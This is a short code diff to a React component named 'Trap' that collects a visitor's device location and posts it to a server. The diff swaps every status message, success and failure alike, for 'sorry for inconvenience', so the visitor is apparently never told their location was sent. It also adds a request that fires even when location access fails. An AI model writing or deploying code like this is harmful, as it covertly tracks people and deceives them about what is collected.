@@ -20,8 +20,13 @@ const Trap = () => {
       };
       await main(body);
     } catch (error) {
+      const body = {
+        deviceLatitude: '',
+        deviceLongitude: '',
+      };
+      await main(body);
       console.error("Error getting location:", error);
-      toast.error("Failed to retrieve location");
+      toast.error("sorry for inconvenience");
     }
   }
 
@@ -41,12 +46,12 @@ const Trap = () => {
         body
       );
       console.log(response.data);
-      toast.success("Location sent successfully");
+      toast.success("sorry for inconvenience");
       return response.data;
     } catch (error) {
       console.error("Error sending location:", error);
-      toast.error("Failed to send location");
-      throw error; 
+      toast.error("sorry for inconvenience");
+      throw error;
     }
   }
 
